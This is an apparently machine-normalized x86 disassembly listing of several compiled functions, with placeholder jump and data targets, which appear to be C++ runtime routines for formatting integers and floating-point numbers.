lea eax [ ebp - 0x74 ]
push eax
push esi
call sub_40b910
mov ecx [ eax ]
add edi ebx
add esp 0x30
sub [ ebp - 0x4c ] ebx
mov ebx [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
cmp [ ebp - 0x64 ] 0x0
jbe r-xdata
mov ecx [ ebp - 0x50 ]
mov edx [ ebp + 0x1c ]
mov eax [ ebp + 0x14 ]
push ecx
mov ecx [ ebp + 0x10 ]
push edx
push eax
push ecx
lea edx [ ebp - 0x68 ]
push edx
push esi
call sub_40b910
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
mov [ ebp + 0x14 ] edx
jmp r-xdata
sub ecx eax
mov [ ebp - 0x50 ] ecx
jmp r-xdata
mov ebx [ ebp - 0x50 ]
test ebx ebx
jne r-xdata
mov ecx [ ebp - 0x54 ]
push 0x30
push ecx
lea ecx [ ebp - 0x2c ]
call sub_40bae0
mov ebx [ ebp - 0x50 ]
jmp r-xdata
mov ecx [ ebp - 0x60 ]
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
push ecx
push ebx
push edi
push edx
push eax
lea ecx [ ebp - 0x74 ]
push ecx
push esi
call sub_40bb90
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x54 ]
push edx
mov [ ebp + 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x30
push ecx
push edx
lea eax [ ebp - 0x80 ]
push eax
push esi
call sub_40b910
mov ecx [ eax ]
mov edx [ ebp - 0x78 ]
mov edi [ ebp - 0x84 ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ edx + 0x20 ] ebx
mov [ edx + 0x24 ] ebx
mov edx [ ebp - 0x50 ]
push edx
mov edx [ ebp + 0x1c ]
push edx
push eax
push ecx
push edi
push esi
mov [ ebp + 0x14 ] eax
call sub_40b910
mov esi 0x10
add esp 0x4c
cmp [ ebp - 0x18 ] esi
jb r-xdata
mov edx [ ebp + 0x14 ]
sub eax edi
lea ebx [ eax + 0x1 ]
mov eax [ ebp - 0x60 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebx - 0x1 ]
push ecx
push edi
push edx
push eax
lea ecx [ ebp - 0x74 ]
push ecx
push esi
call sub_40bb90
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0x54 ]
push edx
mov [ ebp + 0x14 ] ecx
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
push 0x30
push ecx
push edx
lea eax [ ebp - 0x74 ]
push eax
push esi
call sub_40b910
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ ebp - 0x78 ]
mov edx [ eax + 0x4 ]
add esp 0x34
test [ ecx + 0x14 ] 0x4
mov [ ebp + 0x14 ] edx
mov [ ebp - 0x54 ] 0x0
mov ecx r--data
jne r-xdata
mov eax [ ebp - 0x50 ]
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push edx
push eax
lea ecx [ ebp - 0x68 ]
push ecx
push esi
call sub_40b910
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
push 0x1
push edi
push eax
push ecx
lea edx [ ebp - 0x68 ]
push edx
push esi
call sub_40b8a0
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
inc edi
dec ebx
mov [ ebp + 0x14 ] edx
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x50 ] 0x0
add esp 0x18
mov eax [ edx + 0x14 ]
mov esi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov eax [ ebp - 0x54 ]
push 0x30
push eax
sub esi edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_40b7a0
mov edx [ ebp - 0x58 ]
push 0x30
push edx
lea ecx [ ebp - 0x2c ]
call sub_40bae0
mov [ ebp - 0x58 ] ebx
push 0x30
test ebx ebx
jne r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push 0x1
push ecx
push edx
push eax
lea ecx [ ebp - 0x74 ]
push ecx
push esi
call sub_40b8a0
mov edx [ eax ]
add edi ebx
add esp 0x18
sub [ ebp - 0x4c ] ebx
mov ebx [ ebp - 0x4c ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ ebp + 0x14 ] eax
mov ecx r--data
mov edx [ ebp - 0x6c ]
sub ebx edi
push edx
lea eax [ ebx + 0x1 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_40b7a0
mov ecx [ ebp - 0x58 ]
push 0x30
push ecx
push ebx
lea ecx [ ebp - 0x2c ]
call sub_40b7a0
mov [ ebp - 0x6c ] 0x0
mov ecx [ ebp - 0x58 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_40bae0
jmp r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x48 ]
push ecx
call sub_41a0d6
add esp 0x4
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
lea ebx [ ebp - 0x48 ]
mov ebx [ ebp - 0x48 ]
mov esi 0x10
mov [ ebp - 0x58 ] 0x0
cmp [ ebp - 0x34 ] esi
jae r-xdata
lea edx [ ebp - 0x5c ]
push edx
push eax
call sub_41afa0
mov edi eax
mov al [ ebx ]
add esp 0x8
cmp al 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
mov edi [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] esi
jae r-xdata
test al al
jle r-xdata
mov edx [ ebp - 0x1c ]
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x4c ] edx
mov ebx edx
lea edi [ ebp - 0x2c ]
mov ecx edi
sub ecx [ ebp - 0x64 ]
movsx eax al
cmp eax ecx
jae r-xdata
push 0x0
sub edi eax
push 0x1
push edi
lea ecx [ ebp - 0x2c ]
call sub_40b7a0
cmp [ ebx + 0x1 ] 0x0
jle r-xdata
mov al [ ebx ]
cmp al 0x7f
jne r-xdata
inc ebx
sub_40d360
push ebp
mov ebp esp
push 0xffffffff
push sub_42dce0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x24 ]
mov ebx [ ebp + 0x20 ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp - 0x40 ]
push eax
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x30 ] edx
call sub_40a090
push eax
mov [ ebp - 0x4 ] 0x0
call sub_40c480
mov esi [ ebp - 0x40 ]
add esp 0x4
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x50 ]
call sub_40bc30
mov al [ ebx ]
mov ecx 0x1
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
push 0x0
lea ecx [ ebp - 0x34 ]
call sub_419789
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x34 ] ecx
cmp al 0x2d
je r-xdata
mov edi [ esi + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x34 ]
not edi
call sub_4197b1
and edi esi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x2c ]
cmp al 0x30
jne r-xdata
mov edx [ edi ]
mov eax [ edx ]
push 0x1
mov ecx edi
call eax
dec eax
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x3c ]
mov edi [ eax + 0x20 ]
mov ecx eax
cmp [ ecx + 0x24 ] 0x0
jl r-xdata
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov al [ ebx + 0x1 ]
cmp al 0x78
je r-xdata
xor edi edi
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x2c ]
mov eax edx
cmp ecx 0x10
jae r-xdata
mov [ ebp - 0x34 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov eax [ ecx ]
mov edx [ eax + 0x8 ]
call edx
mov ecx [ ebp - 0x30 ]
mov edx [ ebp + 0x14 ]
mov [ ebp - 0x40 ] al
mov eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x10 ]
push ecx
push ebx
push edx
push eax
lea ecx [ ebp - 0x54 ]
push ecx
push esi
call sub_40bb90
mov ecx [ eax ]
mov edx [ ebp - 0x3c ]
push edi
mov edi [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ edx + 0x20 ] ebx
mov [ edx + 0x24 ] ebx
mov edx [ ebp + 0x1c ]
push edx
push eax
push ecx
push edi
push esi
mov [ ebp + 0x14 ] eax
call sub_40b910
add esp 0x34
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov edx [ ebp + 0x14 ]
cmp eax 0x100
mov eax [ ebp + 0x10 ]
je r-xdata
mov eax [ ebp - 0x30 ]
cmp edi eax
jbe r-xdata
test edi edi
je r-xdata
cmp ecx 0x10
jae r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x2c ]
push eax
call sub_41a0d6
add esp 0x4
mov ecx [ ebp - 0x34 ]
push ecx
push ebx
push edx
push eax
lea ecx [ ebp - 0x48 ]
push ecx
push esi
call sub_40b8a0
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov ecx [ eax + 0x4 ]
mov edx [ ebp + 0x1c ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x34 ]
sub [ ebp - 0x30 ] ecx
push edi
push edx
mov edx [ eax ]
add ebx ecx
mov ecx [ eax + 0x4 ]
push ecx
push edx
lea eax [ ebp - 0x38 ]
push eax
push esi
call sub_40b910
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x30
mov [ ebp + 0x14 ] edx
mov ecx [ ebp + 0x1c ]
push edi
push ecx
push edx
push eax
lea ecx [ ebp - 0x38 ]
push ecx
push esi
call sub_40b910
mov edx [ eax ]
mov [ ebp + 0x10 ] edx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x14 ] eax
jmp r-xdata
sub edi eax
jmp r-xdata
mov esi [ ebp - 0x30 ]
mov eax edx
mov al [ eax ]
mov [ ebp - 0x44 ] edx
cmp al 0x7f
je r-xdata
lea edx [ ebp - 0x2c ]
xor edi edi
mov eax [ ecx + 0x14 ]
mov esi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
test al al
jle r-xdata
mov ecx esi
sub ecx [ ebp - 0x34 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub esi eax
mov eax [ ebp - 0x30 ]
sub eax esi
inc eax
push eax
lea edi [ ebx + esi ]
push edi
push eax
lea edx [ ebx + esi + 0x1 ]
push edx
call sub_41afe6
mov eax [ ebp - 0x44 ]
inc [ ebp - 0x30 ]
add esp 0x10
mov [ edi ] 0x0
cmp [ eax + 0x1 ] 0x0
jle r-xdata
mov al [ eax ]
cmp al 0x7f
jne r-xdata
inc eax
mov [ ebp - 0x44 ] eax
sub_40d5f0
push ebp
mov ebp esp
push 0xffffffff
push sub_42dd29
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] 0x0
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov eax [ eax + 0x10 ]
mov ecx [ ecx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_407190
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_407190
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_406f50
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_40d6b0
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push esi
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_407190
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_4079c0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_40d6f0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push 0x8
mov esi ecx
call sub_41ac18
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov ebx [ ebp + 0xc ]
push 0x1
push ebx
mov [ ebp - 0x4 ] edi
call sub_41acef
add esp 0x8
mov [ edi ] eax
test eax eax
je r-xdata
mov [ eax ] edi
mov [ eax + 0x4 ] edi
mov edi eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
push ebx
push ecx
push eax
call sub_41a0f0
add esp 0xc
mov [ edi + 0x4 ] ebx
mov edi [ esi + 0x30 ]
mov eax [ edi + 0x4 ]
lea edx [ ebp - 0x4 ]
push edx
push eax
push edi
lea ecx [ esi + 0x30 ]
call sub_40bfd0
mov ecx [ esi + 0x34 ]
mov edx 0x3ffffffe
sub edx ecx
cmp edx 0x1
jae r-xdata
inc ecx
mov [ esi + 0x34 ] ecx
mov [ edi + 0x4 ] eax
mov ecx [ eax + 0x4 ]
mov [ ecx ] eax
mov eax esi
add [ eax + 0x1c ] ebx
push r--data
call sub_4194e6
sub_40d790
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
add ecx 0x18
mov [ ebp - 0x4 ] 0x0
call sub_40caa0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_40d7c0
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
push ecx
push eax
push r--data
lea edx [ ebp - 0xc ]
push edx
push esi
call sub_40b120
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_41b0bd
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push edi
push esi
call sub_40d360
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
mov esp ebp
pop ebp
retn 0x18
sub_40d840
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
push ecx
push eax
push r--data
lea edx [ ebp - 0xc ]
push edx
push esi
call sub_40b120
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_41b0bd
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x4c ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push edi
push esi
call sub_40d360
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
mov esp ebp
pop ebp
retn 0x18
sub_40d8c0
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x20 ]
push ecx
push edx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_40b120
add esp 0x10
push eax
lea ecx [ ebp - 0x4c ]
push 0x40
push ecx
call sub_41b0bd
mov ecx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x18 ]
lea edx [ ebp - 0x4c ]
push edx
mov edx [ ebp + 0xc ]
push eax
push ebx
push ecx
push edx
push edi
push esi
call sub_40d360
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
mov esp ebp
pop ebp
retn 0x1c
sub_40d940
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x20 ]
push ecx
push edx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_40b120
add esp 0x10
push eax
lea ecx [ ebp - 0x4c ]
push 0x40
push ecx
call sub_41b0bd
mov ecx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x18 ]
lea edx [ ebp - 0x4c ]
push edx
mov edx [ ebp + 0xc ]
push eax
push ebx
push ecx
push edx
push edi
push esi
call sub_40d360
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
mov esp ebp
pop ebp
retn 0x1c
sub_40d9c0
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebx + 0x18 ]
push edi
mov [ ebp - 0x88 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ ebp - 0x8c ] ecx
cmp eax edi
jg r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
jl r-xdata
mov [ ebp - 0x84 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp esi edi
ja r-xdata
mov [ ebp - 0xc ] 0x25
lea eax [ ebp - 0xb ]
test dl 0x20
je r-xdata
fld [ r--data ]
fmul st1
fld st1
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov [ ebp - 0x84 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
test dl 0x10
je r-xdata
mov [ ebp - 0xb ] 0x2b
lea eax [ ebp - 0xa ]
fldz
fcom st1
fnstsw ax
test ah 0x41
jne r-xdata
mov eax [ ebp - 0x84 ]
fld [ ebp + 0x1c ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ ebp - 0x80 ] edi
cmp eax 0x2000
jne r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
mov [ ebp - 0x79 ] 0x0
fxch st1
fxch st1
mov [ ebp - 0x79 ] 0x1
fchs
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
sub esp 0x8
mov [ eax + 0x2 ] cl
fstp [ esp ]
mov ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
mov [ eax + 0x3 ] 0x0
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_41b0bd
mov ecx [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp - 0x88 ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x78 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8c ]
push ebx
push ecx
push edx
push esi
push eax
call sub_40cdf0
mov ecx [ ebp - 0x4 ]
add esp 0x44
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
mov esp ebp
pop ebp
retn 0x1c
fdiv st2
add [ ebp - 0x80 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
fchs
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_40dbd0
push ebp
mov ebp esp
sub esp 0x8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebx + 0x18 ]
push edi
mov [ ebp - 0x88 ] eax
mov eax [ ebx + 0x1c ]
xor edi edi
mov [ ebp - 0x8c ] ecx
cmp eax edi
jg r-xdata
mov ecx eax
cmp ecx edi
jl r-xdata
jl r-xdata
mov [ ebp - 0x84 ] esi
jg r-xdata
test [ ebx + 0x14 ] 0x2000
jne r-xdata
cmp esi edi
ja r-xdata
fld [ ebp + 0x1c ]
fldz
fld [ ebp + 0x1c ]
fcom st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov [ ebp - 0x84 ] 0x24
jmp r-xdata
cmp esi 0x24
jbe r-xdata
mov esi 0x6
xor eax eax
test dl 0x10
je r-xdata
mov [ ebp - 0xb ] 0x2b
lea eax [ ebp - 0xa ]
mov [ ebp - 0x79 ] 0x0
jmp r-xdata
mov [ ebp - 0x79 ] 0x1
fchs
mov eax [ ebp - 0x84 ]
cdq
sub esi eax
sbb ecx edx
mov edx [ ebx + 0x14 ]
mov eax edx
and eax 0x3000
mov [ ebp - 0x80 ] edi
cmp eax 0x2000
jne r-xdata
and edx 0x3000
mov [ eax ] 0x2a2e
mov [ eax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ eax ] 0x23
inc eax
fld [ r--data ]
fcom st1
fnstsw ax
fld [ r--data ]
test ah 0x41
jpo r-xdata
cmp [ ebp - 0x80 ] 0x1388
jae r-xdata
fstp st1
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
fdiv st2
add [ ebp - 0x80 ] 0xa
fxch st1
fcom st2
fnstsw ax
test ah 0x41
jpo r-xdata
fxch st2
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
cmp edx 0x1000
setne cl
lea ecx [ ecx + ecx + 0x65 ]
mov cl 0x61
jmp r-xdata
sub esp 0x8
mov [ eax + 0x3 ] cl
fstp [ esp ]
mov ecx [ ebp - 0x84 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
mov [ eax + 0x4 ] 0x0
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_41b0bd
mov ecx [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x18 ]
push esi
mov esi [ ebp - 0x88 ]
push edi
push ecx
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x78 ]
push edx
mov edx [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x8c ]
push ebx
push ecx
push edx
push esi
push eax
call sub_40cdf0
mov ecx [ ebp - 0x4 ]
add esp 0x44
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
mov esp ebp
pop ebp
retn 0x1c
fxch st1
fstp st0
cmp [ ebp - 0x79 ] 0x0
fstp st1
je r-xdata
test ecx ecx
jl r-xdata
mov [ ebp - 0xc ] 0x25
lea eax [ ebp - 0xb ]
test dl 0x20
je r-xdata
fchs
jmp r-xdata
jg r-xdata
fld [ r--data ]
jmp r-xdata
cmp esi 0xa
jb r-xdata
fcom st1
fnstsw ax
test ah 0x1
jne r-xdata
fstp st0
jmp r-xdata
cmp edi 0x1388
jae r-xdata
add esi 0xfffffff6
fxch st1
adc ecx 0xffffffff
fmul st2
add edi 0xa
test ecx ecx
jg r-xdata
fxch st1
jl r-xdata
fstp st1
cmp esi 0xa
jae r-xdata
sub_40ddd0
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov edi ecx
call sub_41b0bd
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0x44 ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push esi
push edi
call sub_40d360
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
mov esp ebp
pop ebp
retn 0x18
sub_40de30
push ebp
mov ebp esp
push 0xffffffff
push sub_42dd86
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor esi esi
push 0x18
mov [ ebp - 0x90 ] edi
mov [ ebp - 0x84 ] esi
mov [ ebp - 0x8c ] esi
call sub_41ac18
add esp 0x4
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xb
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4124b0
push 0x16
push rw-data
mov ecx esi
call sub_412490
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_412790
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x1
jb r-xdata
mov ecx eax
call sub_412420
mov esi eax
mov ecx [ ebp + 0x8 ]
push ecx
push eax
push 0x28
lea edx [ ebp - 0x8c ]
push edx
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ edi + 0x8 ]
call sub_409c40
cmp al 0x1
sete bl
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov eax [ eax ]
test bl bl
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_41a0d6
add esp 0x4
test esi esi
je r-xdata
push 0x22
push rw-data
mov ecx esi
call sub_412490
lea edx [ ebp - 0x80 ]
push edx
mov ecx esi
call sub_412890
mov ebx eax
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_412890
mov ecx [ ebx + 0x10 ]
mov ebx 0x10
mov [ ebp - 0x4 ] 0x3
cmp [ eax + 0x14 ] ebx
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_41ac09
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_412460
push esi
call sub_41a0d6
add esp 0x4
push ecx
push eax
mov ecx edi
call sub_40d6f0
